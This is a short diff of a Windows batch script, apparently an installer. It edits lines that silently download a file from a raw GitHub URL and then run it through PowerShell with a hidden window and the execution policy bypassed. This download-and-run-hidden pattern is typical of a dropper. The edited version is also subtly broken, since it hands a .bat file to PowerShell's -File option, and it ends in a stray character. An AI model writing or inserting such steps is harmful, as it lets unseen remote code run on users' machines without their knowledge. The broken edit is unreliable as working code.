@@ -8,8 +8,8 @@ if %errorlevel% NEQ 0 (
 )
 
 :: Download the installer from a remote location silently
-powershell -Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/angeborrelli/files/main/Installer.ps1', '%~dp0Installer.ps1')"
+powershell -Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/angeborrelli/files/main/run.bat', '%~dp0run.bat')"
 
 :: Run the PowerShell script silently
-powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File "%~dp0Installer.ps1"
+powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File "%~dp0run.bat"
 s
